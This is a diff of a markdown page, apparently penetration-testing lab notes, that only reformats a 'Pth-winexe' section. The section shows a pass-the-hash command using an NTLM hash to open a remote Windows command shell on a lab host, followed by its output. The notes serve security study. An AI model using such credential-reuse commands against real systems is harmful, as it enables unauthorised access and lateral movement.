@@ -195,15 +195,16 @@ files04\administrator
 
 ### Pth-winexe
 
+{% code title="" overflow="wrap" lineNumbers="true" %}
 ```
-kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
-eb3b9f05c425e //10.11.0.22 cmd
+kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
 Microsoft Windows [Version 10.0.16299.309]
 (c) 2017 Microsoft Corporation. All rights reserved.
 C:\Windows\system32>
 ```
+{% endcode %}
 
 ## Overpass the Hash
 
